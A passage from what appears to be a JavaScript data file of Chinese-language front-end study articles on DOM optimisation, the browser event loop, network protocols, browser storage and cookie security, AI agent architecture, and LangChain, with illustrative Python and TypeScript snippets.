- 使用 CSS transitions 代替 JavaScript 动画：CSS transitions和animations利用GPU加速，在主线程之外执行，不会阻塞JavaScript代码的执行，流畅度更好，性能更优，而JavaScript动画需要每帧计算位置并修改DOM，消耗CPU资源，还可能造成丢帧，应该优先使用CSS实现简单动画

**事件处理：**
- 使用事件委托：事件委托是一种高效的事件处理模式，将事件监听器添加到父元素而不是每个子元素，利用事件冒泡机制处理子元素的事件，这样可以大幅减少事件监听器的数量，降低内存占用，特别是在处理大量相似元素的场景（如列表）时效果显著，事件委托还可以处理动态添加的元素，无需为新元素单独绑定事件
- 合理使用事件监听器：在添加事件监听器时应该考虑是否真正需要，给不需要的元素添加事件监听器会浪费内存和CPU资源，另外要及时移除不再需要的事件监听器，避免内存泄漏，Vue中使用@语法、React中使用addEventListener时都要注意在组件卸载时移除监听器
- 及时移除事件监听器：事件监听器会持有对目标元素的引用，如果不及时移除，当元素被删除或组件卸载时，监听器仍然存在，会阻止垃圾回收导致内存泄漏，在组件的beforeDestroy或useEffect的清理函数中移除监听器，特别是在使用闭包时要注意避免内存泄漏
- 避免在事件处理函数中执行耗时操作：事件处理函数应该尽快执行完毕，将耗时操作放到异步队列中执行，或者使用Web Workers在后台线程处理，避免阻塞主线程导致页面卡顿，可以使用requestIdleCallback在浏览器空闲时执行非关键任务，或者将计算密集型任务拆分到多个帧中执行

**性能监控：**
- 使用 Chrome DevTools Performance 面板：Chrome DevTools的Performance面板可以录制和分析页面的性能表现，包括FPS、CPU使用率、网络请求、页面加载时间等，通过录制页面操作然后分析时间线，可以找出性能瓶颈，如长任务、频繁重排重绘、内存泄漏等，建议在开发阶段定期使用Performance面板检测性能问题
- 监控 DOM 操作性能：可以通过Performance API的mark和measure方法在代码中埋点，测量特定操作的执行时间，监控DOM操作的频率和耗时，找出性能热点进行优化，也可以使用User Timing API将性能数据发送到分析系统，进行持续的性能监控
- 识别性能瓶颈：通过Performance面板的时间线可以识别各种性能瓶颈，如长任务（超过50ms的任务）、强制同步布局（forced synchronous layout）、频繁的垃圾回收等，针对不同的瓶颈采取相应的优化措施，如拆分长任务、优化CSS选择器、减少内存分配等
- 持续优化：性能优化是一个持续的过程，应该建立性能指标监控体系，设置性能预算，定期检测性能变化，及时发现和解决性能退化问题，可以使用Lighthouse、WebPageTest等工具进行自动化性能测试

### 工具与资源

**开发工具：**
- Chrome DevTools
- Firefox Developer Tools
- Edge DevTools
- Safari Developer Tools

**性能分析工具：**
- Lighthouse
- WebPageTest
- Chrome DevTools Performance
- React DevTools

**学习资源：**
- MDN DOM 文档
- Google Web Fundamentals
- JavaScript 高级程序设计
- 前端性能优化指南

### 案例分析

**大型应用 DOM 优化：**
- Google Docs 的 DOM 优化
- Facebook 的 DOM 优化
- 阿里巴巴的 DOM 优化
- 腾讯的 DOM 优化

**实施效果：**
- 页面渲染速度提升
- 用户交互响应时间减少
- 内存使用优化
- 整体性能改善`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"event-loop",title:"浏览器事件循环与异步编程",category:"browser",difficulty:"medium",tags:["浏览器原理","事件循环","异步编程","JavaScript"],content:`## 浏览器事件循环与异步编程

事件循环是 JavaScript 异步编程的核心机制，理解它对于掌握异步编程至关重要。

### 事件循环概念

**定义：**
- JavaScript 运行时的机制
- 处理异步操作
- 协调事件、用户交互、脚本执行、UI 渲染
- 确保单线程 JavaScript 的非阻塞执行

**单线程特性：**
- JavaScript 是单线程的
- 避免了多线程的复杂性
- 通过事件循环实现异步
- 防止 UI 渲染阻塞

### 任务队列

**宏任务 (Macro Task)：**
- 脚本执行
- setTimeout
- setInterval
- setImmediate (Node.js)
- I/O 操作
- 网络请求
- 事件回调

**微任务 (Micro Task)：**
- Promise.then()
- Promise.catch()
- Promise.finally()
- async/await
- MutationObserver
- process.nextTick (Node.js)

**任务执行顺序：**
1. 执行同步代码
2. 执行微任务队列中的所有任务
3. 执行宏任务队列中的一个任务
4. 重复步骤 2-3

### 事件循环工作流程

**执行栈：**
- 存放正在执行的代码
- 函数调用时入栈
- 函数执行完毕后出栈
- 执行栈为空时处理任务队列

**任务队列：**
- 存放异步任务
- 分为宏任务队列和微任务队列
- 事件循环不断检查队列
- 按顺序执行任务

**渲染时机：**
- 每次事件循环结束后可能进行渲染
- 浏览器决定何时渲染
- 避免频繁渲染影响性能
- 渲染时机与任务队列相关

### 异步编程模式

**回调函数：**
- 最早的异步编程模式
- 容易导致回调地狱
- 代码可读性差
- 错误处理复杂

**Promise：**
- 解决回调地狱
- 链式调用
- 更好的错误处理
- 支持并行操作

**async/await：**
- 基于 Promise
- 同步代码风格
- 更好的错误处理
- 代码可读性高

**事件发布/订阅：**
- 基于事件的异步模式
- 解耦组件
- 适合复杂应用
- 可能导致内存泄漏

### 常见异步场景

**定时器：**
- setTimeout：延迟执行
- setInterval：重复执行
- requestAnimationFrame：动画
- requestIdleCallback：空闲时执行

**网络请求：**
- XMLHttpRequest
- fetch API
- axios
- WebSocket

**文件操作：**
- FileReader
- File API
- Blob
- FormData

**用户交互：**
- 点击事件
- 键盘事件
- 鼠标事件
- 触摸事件

### 事件循环与性能

**性能优化：**
- 避免长任务阻塞主线程
- 使用 Web Workers 处理耗时操作
- 合理使用 setTimeout 分解任务
- 优化事件处理函数

**任务优先级：**
- 微任务优先级高于宏任务
- requestAnimationFrame 优先级高于 setTimeout
- 合理安排任务顺序
- 避免任务饥饿

**内存管理：**
- 及时清理事件监听器
- 避免闭包导致的内存泄漏
- 合理使用 WeakMap 和 WeakSet
- 监控内存使用

### 浏览器与 Node.js 事件循环

**差异：**
- 浏览器事件循环：处理 UI 渲染
- Node.js 事件循环：处理 I/O 操作
- 微任务执行时机不同
- 任务队列数量不同

**Node.js 事件循环阶段：**
1. timers：处理 setTimeout/setInterval
2. I/O callbacks：处理 I/O 回调
3. idle, prepare：内部使用
4. poll：轮询 I/O 事件
5. check：处理 setImmediate
6. close callbacks：处理关闭事件

### 最佳实践

**异步编程：**
- 优先使用 async/await
- 合理使用 Promise
- 避免回调地狱
- 正确处理错误

**性能优化：**
- 避免长任务
- 合理使用 Web Workers
- 优化事件处理
- 监控异步操作

**代码组织：**
- 模块化异步代码
- 合理使用 Promise.all 和 Promise.race
- 避免过度使用 async/await
- 保持代码可读性

### 工具与资源

**调试工具：**
- Chrome DevTools Sources 面板
- Chrome DevTools Performance 面板
- Node.js 调试器
- VS Code 调试器

**学习资源：**
- MDN 事件循环文档
- JavaScript 高级程序设计
- You Don't Know JS: Async & Performance
- Google Web Fundamentals

### 案例分析

**异步编程模式：**
- Promise 链式调用
- async/await 同步风格
- 事件发布/订阅模式
- 混合使用多种模式

**性能优化案例：**
- 长任务分解
- Web Workers 应用
- 事件处理优化
- 内存泄漏修复`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"network-protocol",title:"网络协议与浏览器通信",category:"browser",difficulty:"medium",tags:["浏览器原理","网络协议","HTTP","HTTPS","WebSocket"],content:`## 网络协议与浏览器通信

网络协议是浏览器与服务器通信的基础，理解网络协议对于前端开发和性能优化至关重要。

### HTTP 协议

**HTTP/1.1：**
- 持久连接：减少连接建立时间
- 管道化：并行发送请求
- 分块传输编码：流式传输
- 主机头：支持虚拟主机

**HTTP/2：**
- 多路复用：一个连接处理多个请求
- 服务器推送：主动推送资源
- 头部压缩：减少头部大小
- 二进制分帧：更高效的数据传输

**HTTP/3：**
- 基于 QUIC 协议
- 更快的连接建立
- 更好的拥塞控制
- 更强的可靠性

### HTTPS

**SSL/TLS：**
- 加密传输
- 服务器认证
- 数据完整性
- 防止中间人攻击

**证书：**
- 数字证书
- CA 认证
- 证书链
- 证书验证

**HTTPS 握手：**
1. Client Hello：客户端发送支持的加密算法
2. Server Hello：服务器选择加密算法并发送证书
3. Client Key Exchange：客户端验证证书并发送密钥
4. Server Finish：服务器确认密钥
5. Client Finish：客户端确认连接

### WebSocket

**WebSocket 协议：**
- 全双工通信
- 实时数据传输
- 减少 HTTP 开销
- 适合实时应用

**WebSocket 连接：**
1. 客户端发送 WebSocket 握手请求
2. 服务器响应 WebSocket 握手
3. 建立持久连接
4. 双向数据传输

**WebSocket 应用：**
- 实时聊天
- 在线游戏
- 实时数据仪表盘
- 协作工具

### 网络请求流程

**DNS 解析：**
- 域名 → IP 地址
- DNS 缓存
- DNS 服务器查询
- DNS 记录类型

**TCP 连接：**
- 三次握手：建立连接
- 四次挥手：关闭连接
- 拥塞控制
- 流量控制

**HTTP 请求：**
- 请求方法：GET, POST, PUT, DELETE
- 请求头：Host, User-Agent, Accept
- 请求体：表单数据, JSON
- 请求参数：URL 参数, 表单数据

**HTTP 响应：**
- 状态码：200, 404, 500
- 响应头：Content-Type, Cache-Control
- 响应体：HTML, JSON, 图片
- 重定向：301, 302

### 💾 浏览器缓存

**强缓存：**
- **Cache-Control**：max-age, no-cache, no-store
- **Expires**：过期时间
- **无需向服务器请求**
- **直接使用缓存**

**协商缓存：**
- **ETag**：资源版本标识符
- **Last-Modified**：最后修改时间
- **向服务器验证资源是否过期**
- **未过期则使用缓存**

**缓存位置：**
- **Memory Cache**：内存缓存
- **Disk Cache**：磁盘缓存
- **Service Worker Cache**：Service Worker 缓存
- **Push Cache**：推送缓存

### 🌐 CORS 跨域资源共享

**同源策略：**
- **限制不同源之间的交互**
- **源：协议, 域名, 端口**
- **保护用户数据安全**

**CORS 机制：**
- **预检请求：OPTIONS**
- **响应头：Access-Control-Allow-Origin**
- **凭证处理：withCredentials**
- **暴露头：Access-Control-Expose-Headers**

**CORS 配置：**
- **服务器端设置响应头**
- **支持的请求方法**
- **支持的请求头**
- **预检请求缓存时间**

### 🚀 网络性能优化

**减少请求数量：**
- 资源合并：CSS/JS 合并
- 精灵图：合并小图标
- 内联关键 CSS
- 减少第三方脚本

**减少请求大小：**
- 压缩资源：gzip, brotli
- 最小化 CSS/JS/HTML
- 优化图片：WebP, 压缩
- 移除不必要的代码

**请求优化：**
- 预加载关键资源
- 延迟加载非关键资源
- 预连接到重要域名
- 资源提示：dns-prefetch, preconnect, preload

**CDN：**
- 内容分发网络
- 就近访问资源
- 提高加载速度
- 减轻源服务器负担

### 网络监控与分析

**网络监控：**
- Chrome DevTools Network 面板
- WebPageTest
- Lighthouse
- New Relic

**关键指标：**
- DNS 解析时间
- TCP 连接时间
- TLS 握手时间
- 首字节时间 (TTFB)
- 内容传输时间
- 总加载时间

**网络错误处理：**
- 超时处理
- 重试机制
- 错误提示
- 降级策略

### 最佳实践

**协议选择：**
- 使用 HTTPS
- 升级到 HTTP/2 或 HTTP/3
- 合理使用 WebSocket
- 优化网络配置

**缓存策略：**
- 实施合理的缓存策略
- 静态资源长缓存
- 动态资源协商缓存
- 缓存失效策略

**性能优化：**
- 减少请求数量和大小
- 优化关键渲染路径
- 使用 CDN 分发资源
- 监控网络性能

**安全实践：**
- 实施 HTTPS
- 防止 CSRF 攻击
- 防止 XSS 攻击
- 安全的 CORS 配置

### 学习资源

**网络协议：**
- HTTP 权威指南
- TCP/IP 详解
- MDN Web Docs
- RFC 文档

**性能优化：**
- Web Vitals
- Lighthouse
- Google Web Fundamentals
- 前端性能优化指南

### 案例分析

**大型网站网络优化：**
- Google 的网络优化
- Facebook 的网络优化
- Amazon 的网络优化
- 阿里巴巴的网络优化

**实施效果：**
- 页面加载速度提升
- 用户体验改善
- 服务器负载减少
- 带宽使用优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"browser-storage",title:"浏览器存储机制",category:"browser",difficulty:"medium",tags:["浏览器原理","浏览器存储","localStorage","SessionStorage","IndexedDB"],content:`## 浏览器存储机制

浏览器提供了多种存储机制，用于在客户端存储数据，了解这些存储机制对于前端开发至关重要。

### 存储机制对比

**Cookie：**
- 大小限制：约 4KB
- 生命周期：可设置过期时间
- 作用域：域名
- 随请求发送：是的
- 适合：会话管理、用户偏好

**localStorage：**
- 大小限制：约 5MB
- 生命周期：持久存储
- 作用域：同源
- 随请求发送：否
- 适合：用户偏好、缓存数据

**sessionStorage：**
- 大小限制：约 5MB
- 生命周期：会话期间
- 作用域：同源、同窗口
- 随请求发送：否
- 适合：临时数据、表单数据

**IndexedDB：**
- 大小限制：较大（视浏览器而定）
- 生命周期：持久存储
- 作用域：同源
- 随请求发送：否
- 适合：大型数据、复杂数据结构

**Service Worker Cache：**
- 大小限制：较大
- 生命周期：由 Service Worker 控制
- 作用域：Service Worker 作用域
- 随请求发送：否
- 适合：离线访问、资源缓存

### Cookie

**Cookie 特性：**
- 键值对存储
- 可设置域名和路径
- 可设置安全属性：HttpOnly, Secure, SameSite
- 可设置过期时间

**Cookie 用途：**
- 会话管理：存储会话 ID
- 用户偏好：存储用户设置
- 跟踪：分析用户行为
- 认证：存储认证信息

**Cookie 安全：**
- HttpOnly：防止 JavaScript 访问：HttpOnly是Cookie的一个安全属性，当设置HttpOnly属性时，Cookie无法通过JavaScript的document.cookie API访问，这样可以防止XSS攻击窃取Cookie，HttpOnly属性对于包含会话信息的Cookie非常重要，即使页面存在XSS漏洞，攻击者也无法通过JavaScript获取设置了HttpOnly的Cookie
- Secure：仅通过 HTTPS 传输：Secure是Cookie的一个安全属性，当设置Secure属性时，Cookie只能通过HTTPS协议传输，不能通过HTTP传输，这样可以防止Cookie在传输过程中被窃听或劫持，Secure属性对于包含敏感信息（如会话ID、认证令牌）的Cookie非常重要，现代浏览器在HTTPS环境下会自动为Cookie添加Secure属性
- SameSite：防止 CSRF 攻击：SameSite是Cookie的一个安全属性，用于控制Cookie在跨站请求中的发送行为，SameSite有三个值：Strict（最严格，只在同站请求中发送Cookie）、Lax（默认值，允许在顶级导航请求中发送Cookie）、None（允许跨站发送Cookie，但必须配合Secure属性），SameSite属性可以有效防止CSRF攻击
- 合理设置过期时间：Cookie的过期时间决定了Cookie的有效期，可以通过expires属性设置具体的过期日期和时间，也可以通过max-age属性设置Cookie的有效期（以秒为单位），合理设置Cookie的过期时间可以平衡用户体验和安全性，会话Cookie应该设置较短的过期时间或设置为会话Cookie（关闭浏览器后失效），持久化Cookie应该根据业务需求设置合理的过期时间

**Cookie 操作：**
- 设置：document.cookie = "name=value; expires=date; path=/; domain=example.com; secure; HttpOnly"
- 读取：document.cookie
- 删除：设置过期时间为过去的时间

### localStorage

**localStorage 特性：**
- 键值对存储
- 字符串值
- 持久存储
- 同源限制

**localStorage 操作：**
- 设置：localStorage.setItem('key', 'value')
- 读取：localStorage.getItem('key')
- 删除：localStorage.removeItem('key')
- 清空：localStorage.clear()

**localStorage 限制：**
- 仅存储字符串
- 大小限制约 5MB
- 同步 API
- 易受 XSS 攻击

**localStorage 最佳实践：**
- 存储非敏感数据
- 定期清理过期数据
- 序列化复杂数据：JSON.stringify/JSON.parse
- 错误处理：try/catch

### sessionStorage

**sessionStorage 特性：**
- 键值对存储
- 字符串值
- 会话期间存储
- 同源、同窗口限制

**sessionStorage 操作：**
- 设置：sessionStorage.setItem('key', 'value')
- 读取：sessionStorage.getItem('key')
- 删除：sessionStorage.removeItem('key')
- 清空：sessionStorage.clear()

**sessionStorage 用途：**
- 表单数据：临时存储表单输入
- 会话状态：存储会话期间的状态
- 临时数据：不需要持久化的数据
- 多窗口隔离：不同窗口的 sessionStorage 独立

### IndexedDB

**IndexedDB 特性：**
- 事务性数据库
- 支持复杂数据结构
- 异步 API
- 较大的存储容量

**IndexedDB 操作：**
- 打开数据库：indexedDB.open('name', version)
- 创建对象存储空间：createObjectStore('store', { keyPath: 'id' })
- 添加数据：store.add(data)
- 获取数据：store.get(key)
- 更新数据：store.put(data)
- 删除数据：store.delete(key)

**IndexedDB 用途：**
- 离线应用：存储离线数据
- 大型数据：存储大量数据
- 复杂数据：存储复杂数据结构
- 缓存：缓存 API 响应

**IndexedDB 最佳实践：**
- 使用事务确保数据一致性
- 合理使用索引提高查询性能
- 错误处理：try/catch
- 定期清理过期数据

### Service Worker Cache

**Service Worker Cache 特性：**
- 可编程缓存
- 支持任意资源
- 离线访问
- 由 Service Worker 控制

**Service Worker Cache 操作：**
- 打开缓存：caches.open('name')
- 添加资源：cache.add('url')
- 添加多个资源：cache.addAll(['url1', 'url2'])
- 获取资源：cache.match('url')
- 删除资源：cache.delete('url')

**Service Worker Cache 用途：**
- 离线访问：PWA 应用
- 资源缓存：提高加载速度
- 缓存策略：自定义缓存逻辑
- 网络请求拦截：修改请求和响应

### 存储安全

**安全风险：**
- XSS 攻击：窃取存储数据
- CSRF 攻击：利用 Cookie
- 信息泄露：敏感数据存储
- 数据篡改：存储数据被修改

**防护措施：**
- 加密敏感数据
- 使用 HttpOnly Cookie
- 实施 CSP
- 验证存储数据
- 定期清理数据

### 存储最佳实践

**数据分类：**
- 敏感数据：避免在前端存储
- 非敏感数据：localStorage
- 会话数据：sessionStorage
- 大型数据：IndexedDB
- 离线数据：Service Worker Cache

**存储策略：**
- 合理选择存储机制
- 实施数据验证
- 定期清理过期数据
- 监控存储使用情况

**性能优化：**
- 减少存储操作频率
- 批量存储操作
- 合理使用缓存
- 避免存储大量数据

**跨浏览器兼容性：**
- 检查存储 API 支持
- 提供降级方案
- 测试不同浏览器
- 遵循标准 API

### 工具与资源

**存储库：**
- localforage：简化 IndexedDB 使用
- dexie.js：IndexedDB 封装
- idb：IndexedDB 封装
- pouchdb：客户端数据库

**开发工具：**
- Chrome DevTools Application 面板
- Firefox Storage Inspector
- Edge DevTools Storage 面板
- Safari Web Inspector Storage 面板

**学习资源：**
- MDN Web Storage API 文档
- MDN IndexedDB 文档
- MDN Service Worker 文档
- Google Web Fundamentals

### 案例分析

**存储方案选择：**
- 金融应用：安全存储策略
- 电商应用：用户偏好存储
- 新闻应用：离线阅读
- 社交媒体：会话管理

**实施效果：**
- 离线访问能力提升
- 加载速度提高
- 用户体验改善
- 数据管理优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"ai-agent",title:"AI Agent 核心原理与实现机制",category:"ai",difficulty:"hard",tags:["AI Agent","智能体","自主决策","多模态AI","强化学习"],content:`## AI Agent 核心原理与实现机制

AI Agent（人工智能代理）是能够感知环境、做出决策并执行行动以实现特定目标的智能系统。现代AI Agent不仅仅是简单的响应式系统，而是具备自主性、反应性、主动性和社会性的复杂智能实体。

### 🤖 AI Agent 的基本概念

AI Agent是一种软件实体，能够在特定环境中自主运行，通过传感器感知环境状态，并通过执行器对环境产生影响。Agent的核心特征包括：

- **自主性（Autonomy）**：能够在没有人类干预的情况下运行
- **反应性（Reactivity）**：能够感知环境变化并作出适当反应
- **主动性（Proactivity）**：能够采取主动行动以实现目标
- **社会性（Social Ability）**：能够与其他Agent或人类交互

### 🧠 Agent 架构设计

现代AI Agent通常采用分层架构设计，主要包括以下几个层次：

#### 感知层（Perception Layer）
感知层负责处理来自环境的各种输入信息，包括：
- 视觉信息处理（图像识别、物体检测）
- 语音信息处理（语音识别、自然语言理解）
- 文本信息处理（语义分析、情感分析）
- 传感器数据处理（温度、湿度、位置等）

#### 认知层（Cognition Layer）
认知层是Agent的核心智能部分，包括：
- **记忆系统**：短期记忆和长期记忆管理
- **推理引擎**：逻辑推理、概率推理、因果推理
- **规划系统**：任务分解、路径规划、资源分配
- **学习机制**：监督学习、无监督学习、强化学习

#### 行动层（Action Layer）
行动层负责将决策转化为具体的行为：
- 语言输出（对话生成、文本创作）
- 物理控制（机器人运动、设备操作）
- 数字操作（API调用、数据库操作）
- 界面交互（GUI操作、网页浏览）

### 🔧 AI Agent 的核心技术

#### 1. 大语言模型集成
现代AI Agent大量依赖大语言模型（LLM）作为其认知核心：

\`\`\`python
class AIAgent:
    def __init__(self, llm_model):
        self.llm = llm_model
        self.memory = MemorySystem()
        self.planner = PlanningSystem()
        
    def perceive(self, observation):
        """感知环境状态"""
        processed_obs = self.process_observation(observation)
        self.memory.update(processed_obs)
        return processed_obs
    
    def reason(self, goal):
        """基于当前状态和目标进行推理"""
        context = self.memory.get_context()
        plan = self.planner.generate_plan(context, goal)
        return plan
    
    def act(self, action_plan):
        """执行行动计划"""
        for action in action_plan:
            result = self.execute_action(action)
            self.memory.update(result)
        return result
\`\`\`

#### 2. 记忆管理系统
AI Agent的记忆系统是其持续学习和适应的关键：

**短期记忆（Working Memory）**
- 存储当前任务相关的临时信息
- 容量有限但访问速度快
- 支持上下文窗口管理

**长期记忆（Long-term Memory）**
- 存储永久性知识和经验
- 采用向量化存储和检索
- 支持知识图谱构建

\`\`\`python
class MemorySystem:
    def __init__(self):
        self.short_term_memory = []
        self.long_term_memory = VectorDB()
        self.episodic_memory = []
        
    def store_short_term(self, info, ttl=60):
        """存储短期记忆"""
        entry = {
            'content': info,
            'timestamp': time.time(),
            'ttl': ttl
        }
        self.short_term_memory.append(entry)
        self.cleanup_expired()
        
    def store_long_term(self, info, metadata=None):
        """存储长期记忆"""
        embedding = self.embed(info['content'])
        self.long_term_memory.add(embedding, info, metadata)
        
    def retrieve_relevant(self, query, k=5):
        """检索相关信息"""
        query_embedding = self.embed(query)
        results = self.long_term_memory.search(query_embedding, k=k)
        return results
\`\`\`

#### 3. 规划与决策系统
AI Agent的规划系统负责将复杂目标分解为可执行的步骤：

**层次化任务规划（Hierarchical Task Planning）**
- 将高级目标分解为子任务
- 生成执行序列和依赖关系
- 处理异常情况和回退策略

**基于模型的规划（Model-based Planning）**
- 构建环境模型进行预测
- 评估不同行动方案的效果
- 选择最优策略

\`\`\`python
class PlanningSystem:
    def __init__(self):
        self.task_decomposer = TaskDecomposer()
        self.action_planner = ActionPlanner()
        
    def generate_plan(self, context, goal):
        """生成执行计划"""
        # 1. 目标分析
        subgoals = self.analyze_goal(goal)
        
        # 2. 任务分解
        tasks = self.decompose_tasks(subgoals, context)
        
        # 3. 行动序列规划
        action_sequence = self.plan_actions(tasks, context)
        
        # 4. 风险评估
        risks = self.assess_risks(action_sequence)
        
        return {
            'tasks': tasks,
            'actions': action_sequence,
            'risks': risks,
            'confidence': self.calculate_confidence(action_sequence)
        }
\`\`\`

### 🎯 AI Agent 的应用场景

#### 1. 客服机器人
现代客服AI Agent能够处理复杂的客户查询：

**多轮对话管理**
- 维护对话状态和上下文
- 识别用户意图和情感
- 提供个性化服务

**知识库集成**
- 实时查询企业知识库
- 整合多个数据源
- 提供准确答案

#### 2. 自动化助手
AI Agent在办公自动化中的应用：

**文档处理**
- 自动摘要和翻译
- 格式转换和排版
- 内容审核和校对

**日程管理**
- 智能会议安排
- 任务优先级排序
- 进度跟踪和提醒

#### 3. 智能推荐系统
基于用户行为的个性化推荐：

**用户画像构建**
- 多维度数据分析
- 兴趣偏好挖掘
- 行为模式识别

**实时推荐**
- 动态内容匹配
- A/B测试优化
- 反馈循环改进

### 🔬 AI Agent 的实现挑战

#### 1. 幻觉问题（Hallucination）
AI Agent可能会生成不准确或虚假的信息：

**解决方案：**
- 实施事实核查机制
- 集成外部知识验证
- 提供置信度评分

#### 2. 记忆一致性
保持长期记忆的一致性和准确性：

**版本控制**
- 跟踪记忆变更历史
- 处理冲突和矛盾
- 支持记忆更新和修正

#### 3. 安全性和伦理
确保AI Agent的安全可靠运行：

**访问控制**
- 权限管理和认证
- 数据隐私保护
- 审计日志记录

### 🚀 未来发展趋势

#### 1. 多模态融合
未来的AI Agent将更好地整合多种感官输入：

**视觉-语言融合**
- 图像理解和生成
- 视频分析和摘要
- AR/VR交互支持

**音频-文本融合**
- 语音识别和合成
- 情感分析和表达
- 多语言支持

#### 2. 协作式AI
多个AI Agent之间的协作：

**分布式智能**
- 任务分工和协调
- 知识共享和同步
- 集体决策机制

#### 3. 自适应学习
AI Agent的持续学习能力：

**在线学习**
- 实时反馈处理
- 模型增量更新
- 个性化适配

### 📊 AI Agent 性能评估

#### 1. 功能性指标
- 任务完成率
- 响应时间
- 准确率和召回率

#### 2. 用户体验指标
- 用户满意度
- 交互流畅度
- 错误恢复能力

#### 3. 系统稳定性
- 可用性百分比
- 故障恢复时间
- 资源利用率

### 🛠️ 实现示例：智能研究助手

以下是一个完整的AI Agent实现示例：

\`\`\`python
import asyncio
from typing import Dict, List, Any
from dataclasses import dataclass
import openai
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity

@dataclass
class AgentState:
    current_task: str
    memory_buffer: List[str]
    confidence_score: float
    execution_history: List[Dict]

class ResearchAssistant:
    def __init__(self, api_key: str):
        self.client = openai.OpenAI(api_key=api_key)
        self.state = AgentState(
            current_task="",
            memory_buffer=[],
            confidence_score=0.0,
            execution_history=[]
        )
        self.vector_store = {}
        
    async def process_query(self, query: str) -> Dict[str, Any]:
        """处理用户查询"""
        # 1. 理解查询意图
        intent = await self.analyze_intent(query)
        
        # 2. 检索相关信息
        relevant_info = await self.retrieve_information(query)
        
        # 3. 生成响应
        response = await self.generate_response(query, relevant_info)
        
        # 4. 更新状态
        self.update_state(query, response)
        
        return {
            'response': response,
            'confidence': self.state.confidence_score,
            'sources': relevant_info.get('sources', [])
        }
    
    async def analyze_intent(self, query: str) -> str:
        """分析查询意图"""
        prompt = f"""
        分析以下查询的意图类型：
        Query: {query}
        
        可能的意图类型：
        - research: 研究分析
        - summary: 内容总结
        - comparison: 对比分析
        - generation: 内容生成
        - question: 问题解答
        
        请返回最合适的意图类型。
        """
        
        response = self.client.chat.completions.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=20
        )
        
        return response.choices[0].message.content.strip().lower()
    
    async def retrieve_information(self, query: str) -> Dict[str, Any]:
        """检索相关信息"""
        # 使用向量搜索查找相关文档
        query_embedding = await self.get_embedding(query)
        similar_docs = self.search_similar_documents(query_embedding)
        
        return {
            'documents': similar_docs[:5],  # 返回前5个相关文档
            'sources': [doc.get('source', '') for doc in similar_docs[:5]]
        }
    
    async def generate_response(self, query: str, context: Dict[str, Any]) -> str:
        """生成响应"""
        prompt = f"""
        基于以下上下文信息回答用户查询：
        
        上下文信息：
        {context.get('documents', [])}
        
        用户查询：{query}
        
        请提供详细、准确且有条理的回答。
        """
        
        response = self.client.chat.completions.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=1000,
            temperature=0.3
        )
        
        return response.choices[0].message.content
    
    def update_state(self, query: str, response: str):
        """更新Agent状态"""
        self.state.memory_buffer.append(f"Q: {query}")
        self.state.memory_buffer.append(f"A: {response}")
        
        # 限制记忆缓冲区大小
        if len(self.state.memory_buffer) > 20:
            self.state.memory_buffer = self.state.memory_buffer[-20:]
        
        # 记录执行历史
        self.state.execution_history.append({
            'query': query,
            'response': response,
            'timestamp': time.time()
        })

# 使用示例
async def main():
    assistant = ResearchAssistant(api_key="your-api-key")
    
    # 处理用户查询
    result = await assistant.process_query("请分析AI Agent的发展趋势")
    
    print(f"Response: {result['response']}")
    print(f"Confidence: {result['confidence']}")
    print(f"Sources: {result['sources']}")

if __name__ == "__main__":
    asyncio.run(main())
\`\`\`

### 📈 AI Agent 的商业价值

#### 1. 成本效益
- 减少人力成本
- 提高工作效率
- 降低错误率

#### 2. 服务质量
- 24/7可用性
- 一致的服务质量
- 个性化体验

#### 3. 创新机会
- 新业务模式
- 产品差异化
- 市场竞争优势

### 🛡️ 安全考虑

#### 1. 数据安全
- 加密传输和存储
- 访问权限控制
- 数据脱敏处理

#### 2. 模型安全
- 对抗攻击防护
- 模型完整性验证
- 输出过滤机制

#### 3. 合规性
- 遵守数据保护法规
- 透明度要求
- 责任归属明确

AI Agent代表了人工智能发展的新阶段，通过结合大语言模型、记忆系统、规划算法等先进技术，实现了更智能、更自主的决策和执行能力。随着技术的不断进步，AI Agent将在更多领域发挥重要作用，成为人机协作的重要桥梁。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"langchain",title:"LangChain 框架深度解析与应用实践",category:"ai",difficulty:"hard",tags:["LangChain","LLM框架","AI开发","链式调用","RAG"],content:`## LangChain 框架深度解析与应用实践

LangChain是一个强大的开源框架，专门用于构建基于大语言模型（LLM）的应用程序。它提供了一套完整的工具、组件和接口，使开发者能够轻松地将LLM集成到各种应用程序中，实现复杂的人工智能功能。

### 🧩 LangChain 核心概念

LangChain的核心理念是将复杂的AI应用分解为可重用的组件，这些组件可以通过链式调用的方式组合起来，形成强大的AI应用。

#### 1. LLMs and Prompts（语言模型和提示）
LangChain支持多种大语言模型，包括OpenAI GPT系列、Anthropic Claude、Hugging Face模型等。

**Prompt Templates（提示模板）**
- 结构化提示管理
- 动态变量注入
- 提示工程最佳实践

\`\`\`typescript
import { PromptTemplate } from "langchain/prompts";

// 创建提示模板
const template = \`你是一个专业的{role}，请基于以下信息回答问题：
上下文：{context}
问题：{question}
请提供详细、准确的回答。\`;

const promptTemplate = new PromptTemplate({
  template,
  inputVariables: ["role", "context", "question"],
});

// 使用模板
const formattedPrompt = await promptTemplate.format({
  role: "技术顾问",
  context: "React是一个JavaScript库",
  question: "React的主要特点是什么？"
});
\`\`\`

#### 2. Chains（链）
Chains是LangChain的核心概念，允许将多个组件链接在一起：

**Simple Sequential Chain（简单顺序链）**
- 按顺序执行多个步骤
- 输入输出自动传递
- 错误处理和重试机制

**Sequential Chain（顺序链）**
- 多输入多输出处理
- 条件分支逻辑
- 并行执行支持

\`\`\`typescript
import { SequentialChain, LLMChain } from "langchain/chains";
import { ChatOpenAI } from "langchain/chat_models/openai";
import { PromptTemplate } from "langchain/prompts";

const model = new ChatOpenAI({ temperature: 0.7 });

// 第一个链：生成摘要
const summarizePrompt = new PromptTemplate({
  template: "请为以下文本生成简洁的摘要：{text}",
  inputVariables: ["text"],
});
const summarizeChain = new LLMChain({
  prompt: summarizePrompt,
  llm: model,
  outputKey: "summary",
});

// 第二个链：基于摘要生成标题
const titlePrompt = new PromptTemplate({
  template: "基于以下摘要生成一个吸引人的标题：{summary}",
  inputVariables: ["summary"],
});
const titleChain = new LLMChain({
  prompt: titlePrompt,
